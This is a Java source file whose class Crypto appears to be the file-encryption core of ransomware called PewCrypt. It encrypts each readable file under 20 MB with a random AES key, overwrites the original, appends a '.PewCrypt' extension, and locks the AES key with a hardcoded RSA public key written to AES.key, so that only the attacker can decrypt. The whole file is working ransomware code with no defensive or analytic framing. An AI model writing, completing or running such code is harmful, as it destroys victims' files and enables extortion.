package main;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class Crypto {

	private final SecureRandom rnd = new SecureRandom();

	private final byte[] RSA_key = new byte[] { 48, (byte) 130, 1, 34, 48, 13, 6, 9, 42, (byte) 134, 72, (byte) 134,
			(byte) 247, 13, 1, 1, 1, 5, 0, 3, (byte) 130, 1, 15, 0, 48, (byte) 130, 1, 10, 2, (byte) 130, 1, 1, 0,
			(byte) 211, (byte) 132, 73, 127, 125, 43, (byte) 148, (byte) 128, (byte) 128, 6, 36, 39, (byte) 220, 47, 57,
			(byte) 161, (byte) 147, (byte) 143, (byte) 202, (byte) 155, 24, 74, (byte) 168, 16, (byte) 164, 86,
			(byte) 160, 4, 9, 21, (byte) 162, (byte) 139, (byte) 144, (byte) 223, 24, 50, 54, 74, 73, 41, (byte) 237,
			58, (byte) 214, 50, 88, (byte) 193, 83, 7, 120, 118, 114, (byte) 163, 6, 89, 94, (byte) 209, 65, 90, 56, 16,
			38, (byte) 171, 81, (byte) 153, 45, (byte) 153, (byte) 175, 125, (byte) 161, 16, 126, 25, (byte) 181,
			(byte) 171, 35, 13, (byte) 144, (byte) 249, 24, (byte) 249, 62, (byte) 145, (byte) 185, (byte) 169,
			(byte) 217, (byte) 229, (byte) 142, 116, (byte) 244, (byte) 141, (byte) 148, (byte) 179, 26, 114,
			(byte) 253, (byte) 146, (byte) 162, (byte) 194, (byte) 165, (byte) 250, 82, (byte) 206, 102, 9, 35, 47, 62,
			17, (byte) 200, 127, (byte) 183, 77, (byte) 147, 90, 78, (byte) 182, (byte) 244, (byte) 186, (byte) 212, 59,
			54, (byte) 217, (byte) 250, (byte) 217, (byte) 253, (byte) 235, 31, (byte) 235, (byte) 248, (byte) 226, 44,
			(byte) 218, 53, 50, 25, 67, 5, 33, 38, 71, 43, 107, (byte) 234, 26, 104, 90, 2, 4, (byte) 144, 72, 53,
			(byte) 217, (byte) 238, 48, (byte) 154, 25, 77, 86, 90, (byte) 238, 69, (byte) 156, (byte) 157, (byte) 174,
			(byte) 245, 66, 107, (byte) 183, 91, 72, 55, (byte) 196, (byte) 163, 125, 121, (byte) 192, (byte) 182,
			(byte) 205, (byte) 158, 36, (byte) 201, 76, 31, (byte) 218, 82, 39, (byte) 193, (byte) 159, 66, 108, 78, 14,
			122, (byte) 137, (byte) 233, (byte) 191, 110, (byte) 198, 123, (byte) 162, (byte) 219, (byte) 154, 11,
			(byte) 223, 88, 119, (byte) 208, 37, (byte) 157, (byte) 187, 60, 79, 64, (byte) 184, (byte) 234, 52, 104,
			56, (byte) 158, (byte) 230, 70, 25, (byte) 254, 84, 14, 73, (byte) 182, (byte) 141, 78, (byte) 249, 11,
			(byte) 187, 51, (byte) 139, 76, 42, (byte) 157, (byte) 213, 95, 88, 85, 42, 8, 14, (byte) 135, (byte) 147,
			(byte) 248, (byte) 189, 50, 117, (byte) 153, 23, 0, 38, (byte) 158, 63, 2, 3, 1, 0, 1 };

	private final byte[] PASS = new byte[32];

	private Cipher cipher;
	private int cipherMode;
	private String[] IgnoredExtentions = new String[] { ".PewCrypt", ".exe", ".jar", ".dll" };

	public Crypto(boolean toEncrypt) {

		// determine mode
		if (toEncrypt) {

			this.cipherMode = Cipher.ENCRYPT_MODE;

		} else {

			this.cipherMode = Cipher.DECRYPT_MODE;

		}

		try {
			// generate random AES pass
			this.rnd.nextBytes(PASS);

			Key AES_key = new SecretKeySpec(PASS, "AES");

			this.cipher = Cipher.getInstance("AES");

			this.cipher.init(this.cipherMode, AES_key);

		} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
			System.out.println(e);
		}
	}

	public boolean encrypt_AES_key() {
		// get KeySpec
		X509EncodedKeySpec ks = new X509EncodedKeySpec(this.RSA_key);

		try {

			KeyFactory kf = KeyFactory.getInstance("RSA");

			// Get public key from KeySpec
			PublicKey pub = kf.generatePublic(ks);

			// create new AES.key file
			File kfile = new File("AES.key");
			kfile.createNewFile();

			// encrypt AES key with public
			Cipher cipher = Cipher.getInstance("RSA");
			cipher.init(Cipher.ENCRYPT_MODE, pub);

			// encrypted data buffer
			byte[] out = cipher.doFinal(this.PASS);

			// write encrypted data to AES.key file
			Files.write(kfile.toPath(), out);

		} catch (InvalidKeySpecException | IOException | NoSuchPaddingException | InvalidKeyException
				| IllegalBlockSizeException | BadPaddingException | NoSuchAlgorithmException e) {
			e.printStackTrace();
			return false;
		}

		return true;
	}

	public boolean ProcessFile(String path) {
		try {
			// get handles
			File file = new File(path);

			// checks if file extension is ignored
			for (String exten : this.IgnoredExtentions) {
				if (file.getName().contains(exten)) {
					return false;
				}
			}

			// file checks
			if (!file.exists() | !file.canRead() | !file.canWrite() | (file.length() > 20000000)) {
				return false;
			}

			// file content buffer
			byte[] fileContent = Files.readAllBytes(file.toPath());

			// encrypted data buffer
			byte[] outputBytes = this.cipher.doFinal(fileContent);

			// write encrypted data back to file
			Files.write(file.toPath(), outputBytes);

			file.renameTo(new File(path + ".PewCrypt"));

			return true;

		} catch (IOException | BadPaddingException | IllegalBlockSizeException e) {

			System.out.println(e);
			return false;
		}
	}

}
